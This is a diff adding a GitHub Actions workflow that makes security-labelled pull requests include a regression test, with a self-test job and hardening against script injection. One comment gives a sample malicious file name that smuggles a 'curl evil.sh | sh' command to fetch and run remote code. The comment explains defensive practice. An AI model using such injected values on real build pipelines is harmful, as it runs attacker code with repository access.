@@ -1,0 +1,155 @@
+name: Security-label test-file gate
+
+# Why this exists
+# ---------------
+# PR #497 (inquiry IDOR fix) shipped to dev without a regression test.
+# PR #493 (equipment IDOR fix) set the right precedent: every security-
+# labelled fix must land with at least one new or modified test file.
+#
+# This workflow enforces that contract at merge time:
+#   - Triggered whenever a PR is opened, updated, re-labelled, or un-labelled.
+#   - If the PR carries the 'security' label, it scans the changed files
+#     for test-file patterns (Rust integration tests, Rust unit test mods,
+#     TypeScript __tests__/ files, etc.).
+#   - If no test file is present it fails with an actionable error message
+#     so the author knows exactly what is missing before merge.
+#
+# The check is advisory (non-blocking) on draft PRs — a draft is a work
+# in progress and we don't want to gate review iteration.  It becomes
+# blocking the moment the PR is marked "ready for review".
+
+on:
+  pull_request:
+    types:
+      - opened
+      - synchronize
+      - reopened
+      - labeled
+      - unlabeled
+      - ready_for_review
+  # Self-test fixture: any push that touches the gate workflow or its
+  # extracted detect-test-file.sh helper exercises the pattern matcher
+  # against a known fixture list so a future refactor that breaks the
+  # detector is caught in CI instead of when a real security PR slips
+  # through (finding #6 — gate is not self-tested).
+  push:
+    paths:
+      - '.github/workflows/security-test-gate.yml'
+      - '.github/workflows/scripts/detect-test-file.sh'
+
+jobs:
+  security-test-gate:
+    name: Security label — test-file required
+    runs-on: ubuntu-latest
+    # Only run on the gate trigger, not on the self-test push (the
+    # self-test job below handles that). Without this guard the job
+    # would attempt to read pull_request context on a push event and
+    # blow up.
+    if: github.event_name == 'pull_request' && contains(github.event.pull_request.labels.*.name, 'security')
+
+    permissions:
+      contents: read
+      pull-requests: read
+
+    steps:
+      # Collect changed files via the `gh` API rather than cloning the
+      # full repo + running `git diff` (finding #2 — checkout with
+      # fetch-depth: 0 is unnecessary). No clone, no merge-base juggling,
+      # and faster startup. Values are passed through env vars to avoid
+      # `${{ }}` shell interpolation (finding #1 — script-injection
+      # surface).
+      - name: Collect changed files
+        id: files
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          PR: ${{ github.event.pull_request.number }}
+          REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          CHANGED=$(gh pr view "$PR" --repo "$REPO" --json files --jq '.files[].path')
+          {
+            echo "list<<EOF"
+            echo "$CHANGED"
+            echo "EOF"
+          } >> "$GITHUB_OUTPUT"
+
+      - uses: actions/checkout@v6
+
+      - name: Check for test file
+        id: gate
+        env:
+          # Read the changed-file list from an env var instead of
+          # inlining `${{ steps.files.outputs.list }}` into the shell
+          # script body (finding #1 — script-injection surface). Even
+          # though `pull_request` (not `_target`) limits blast radius,
+          # a path with shell metacharacters like
+          # `foo"; curl evil.sh | sh; #.rs` could otherwise break out
+          # of the quoting.
+          # https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable
+          CHANGED: ${{ steps.files.outputs.list }}
+        run: |
+          set -euo pipefail
+          HAS_TEST=$(bash .github/workflows/scripts/detect-test-file.sh <<< "$CHANGED")
+          echo "has_test=$HAS_TEST" >> "$GITHUB_OUTPUT"
+
+      - name: Enforce policy
+        env:
+          IS_DRAFT: ${{ github.event.pull_request.draft }}
+          HAS_TEST: ${{ steps.gate.outputs.has_test }}
+        run: |
+          set -euo pipefail
+          if [ "$HAS_TEST" = "true" ]; then
+            echo "PASS: at least one test file is present in this security PR."
+            exit 0
+          fi
+
+          # Draft PRs: warn but don't block (work in progress).
+          if [ "$IS_DRAFT" = "true" ]; then
+            echo "WARN: No test file found in this security-labelled draft PR."
+            echo "      A test file will be required before this PR can merge."
+            echo "      (This check is advisory on draft PRs.)"
+            exit 0
+          fi
+
+          # Ready-for-review / open PRs: hard fail.
+          echo ""
+          echo "FAIL: This PR is labelled 'security' but contains no test file."
+          echo ""
+          echo "  Every security fix must ship with at least one regression test."
+          echo "  This policy was established after PR #497 (inquiry IDOR fix)"
+          echo "  merged without a test, and mirrors the pattern set by PR #493"
+          echo "  (equipment IDOR fix) which included:"
+          echo "    backend/servers/api-server/tests/equipment_cross_tenant_idor_tests.rs"
+          echo ""
+          echo "  Add a test file that covers the security contract introduced"
+          echo "  by this PR (e.g. a cross-tenant isolation assertion, an auth"
+          echo "  boundary check, or an input-validation edge case)."
+          echo ""
+          echo "  Test-file patterns recognised by this gate:"
+          echo "    Rust integration : backend/*/tests/*.rs"
+          echo "    Rust test module : *_test.rs, *_tests.rs, test_*.rs, tests.rs"
+          echo "    TypeScript       : **/__tests__/**, *.test.ts, *.spec.ts"
+          echo "    End-to-end       : e2e/**"
+          echo ""
+          exit 1
+
+  # ---------------------------------------------------------------------
+  # Self-test fixture (finding #6 — gate is not self-tested)
+  #
+  # Runs detect-test-file.sh against a hand-written fixture list and
+  # asserts the expected verdict for each case. If a future refactor
+  # breaks the matcher (or accidentally regresses the bash `case`
+  # globs) this job fails BEFORE the live gate misclassifies a real
+  # security PR.
+  # ---------------------------------------------------------------------
+  self-test:
+    name: Self-test — detect-test-file.sh fixtures
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v6
+      - name: Run fixture-based detector tests
+        run: |
+          set -euo pipefail
+          bash .github/workflows/scripts/detect-test-file.sh --self-test
